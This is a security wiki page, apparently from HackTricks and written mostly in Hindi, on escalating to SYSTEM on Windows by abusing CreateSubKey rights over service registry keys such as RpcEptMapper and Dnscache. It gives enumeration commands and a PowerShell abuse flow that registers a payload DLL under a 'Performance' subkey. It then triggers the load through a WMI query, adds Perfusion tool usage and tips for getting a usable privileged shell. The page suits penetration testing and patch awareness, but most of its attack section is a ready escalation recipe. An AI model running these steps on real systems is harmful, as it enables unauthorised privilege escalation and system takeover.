# AppendData/AddSubdirectory Permission over Service Registry

{{#include ../../banners/hacktricks-training.md}}

**The original post is** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

## Summary

अगर आपके पास किसी service registry key पर सिर्फ **`Create Subkey`** / **`AppendData/AddSubdirectory`** है, तब भी यह एक अच्छा privesc lead है। आम तौर पर आप सीधे **`ImagePath`**, **`ServiceDll`**, या अन्य मौजूदा values को overwrite नहीं कर सकते, लेकिन आप फिर भी इनके नीचे एक **`Performance`** child key बना सकते हैं:

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- कोई भी अन्य **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** key जहाँ आपके token के पास **`KEY_CREATE_SUB_KEY`** हो

Trick यह है कि Windows अभी भी legacy **PerfLib V1** registration model को support करता है। अगर किसी service के पास **`Performance`** subkey है, तो जब कोई performance counter consumer data request करता है, Windows वहाँ से एक DLL load कर सकता है।

Microsoft documentation के अनुसार, minimum registration है:
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
तो offensive takeaway यह है: **सिर्फ इसलिए किसी service registry finding को discard मत करो क्योंकि तुम्हें `SetValue` की बजाय सिर्फ `CreateSubKey` मिला**।

## यह code execution के लिए क्यों काफी है

`Performance` subkey आमतौर पर इन services पर by default मौजूद नहीं होता, इसलिए **`KEY_CREATE_SUB_KEY`** वही primitive है जिसकी तुम्हें ज़रूरत है। एक बार key बन जाए और उसमें `Library`/`Open`/`Collect`/`Close` मौजूद हों, तो कोई भी **performance counter consumer** DLL load trigger कर सकता है।

कुछ महत्वपूर्ण details:

- **`Library`** value एक **full DLL path** की ओर point कर सकती है।
- DLL को **`OpenPerfData`**, **`CollectPerfData`**, और **`ClosePerfData`** export करना चाहिए और `ERROR_SUCCESS` return करना चाहिए।
- Code **consumer's context** में run होता है, **ज़रूरी नहीं कि vulnerable service process itself** में।
- Classic `RpcEptMapper` / `Dnscache` case में, एक **WMI performance query** **`wmiprvse.exe`** से DLL को **`NT AUTHORITY\SYSTEM`** के रूप में load करा सकती है।

इसी वजह से triage के दौरान यह primitive आसानी से miss हो जाता है: parent service key "fully writable" नहीं है, लेकिन फिर भी weaponizable है।

## Quick enumeration

**AccessChk** के साथ manual spot-check:
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
सर्विस keys पर **`CreateSubKey`** वाले low-privileged principals को खोजने के लिए PowerShell example:
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
उपयोगी tooling:

- **PrivescCheck**: `Get-ModifiableRegistryPath` को खास तौर पर इस class of issue को spot करने के लिए बनाया गया था।
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: legacy vulnerable targets पर DLL drop, `Performance` registration, WMI trigger, token duplication, और cleanup को automate करता है (उदाहरण के लिए: `Perfusion.exe -c cmd -i -k Dnscache`).

## Abuse flow

`Performance` subkey बनाएं और required values populate करें:
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
फिर एक **privileged** performance consumer trigger करें। एक classic example `Win32_Perf*` classes पर WMI query है:
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
परिचालन नोट्स:

- **`perfmon.exe`** लॉन्च करना यह सत्यापित करने के लिए उपयोगी है कि counter registration सही है, लेकिन यह आमतौर पर DLL को केवल **आपके अपने user context** में ही load करता है।
- वास्तविक LPE के लिए, **WMI** जैसे किसी **privileged** consumer को trigger करें।
- अगर आप अपना exploit लिख रहे हैं, तो DLL के अंदर से सीधे `cmd.exe` spawn करने पर आमतौर पर आपको **session 0** में shell मिलता है। `Perfusion` इसे attacker's session में suspended बनाई गई process में privileged token को duplicate करके solve करता है।
- DLL architecture को target consumer से match करें (**x64 on x64 systems**).

## Version notes / recent developments

Historically, built-in weak keys थे:

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` और `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

`Perfusion` नोट करता है कि **April 2021** updates ने updated **Windows 8 / Windows Server 2012** पर आसान exploitation path को हटा दिया, जबकि **Windows 7 / Windows Server 2008 R2** अभी भी **`Dnscache`** के माध्यम से exploitable रहा।

यह primitive केवल historical नहीं है। **January 2025** में, Microsoft ने एक related AD DS issue patch किया जहाँ **`Network Configuration Operators`** के members **`Dnscache`** और **`NetBT`** के तहत subkeys create कर सकते थे, और वही **Performance-counter DLL registration** idea supported systems पर **SYSTEM** तक पहुँचने के लिए reuse किया जा सकता था।

इसलिए modern lesson generic है: जब भी किसी low-privileged principal के पास **`CreateSubKey`** on **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** हो, finding को dismiss करने से पहले जाँचें कि क्या **`Performance`** child key पर्याप्त है।

## References

- [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
{{#include ../../banners/hacktricks-training.md}}
